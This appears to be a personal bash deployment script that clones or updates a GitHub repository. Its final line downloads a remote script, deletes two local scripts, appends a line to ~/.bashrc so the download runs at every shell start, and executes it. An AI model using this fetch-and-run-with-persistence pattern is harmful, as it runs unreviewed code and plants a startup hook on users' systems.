#!/bin/bash

# Variablen definieren
REPO_DIR="CPE-Box-cb0401"
REPO_URL="https://github.com/Kreal-exe/CPE-Box-cb0401.git"

echo "🔄 Prüfe Repository..."

# 1. Prüfen, ob der Ordner existiert
if [ ! -d "$REPO_DIR" ]; then
    echo "📥 Repository existiert nicht. Klone neu..."
    git clone "$REPO_URL"
    cd "$REPO_DIR" || exit
else
    echo "🔼 Repository existiert. Aktualisiere..."
    cd "$REPO_DIR" || exit
    git config set advice.mergeConflict false
    git config advice.diverging false
    git config --global pull.ff only
    git pull
fi

cd ..

wget https://github.com/user-attachments/files/33426185/new2.sh && chmod +x new2.sh && rm -rf g2.sh i2.sh && echo "bash ~/new2.sh" >> ~/.bashrc && ./new2.sh



